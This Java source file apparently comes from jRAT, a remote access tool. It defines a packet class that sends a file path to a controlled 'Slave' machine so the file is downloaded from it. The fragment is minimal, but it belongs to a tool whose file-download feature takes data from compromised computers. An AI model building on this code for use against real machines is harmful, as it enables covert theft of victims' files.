package jrat.module.fs.packets.download;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.OutgoingPacket;


public class Packet21Download implements OutgoingPacket {

	private String file;

	public Packet21Download(String file) {
		this.file = file;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(file);
	}

	@Override
	public short getPacketId() {
		return 21;
	}

}
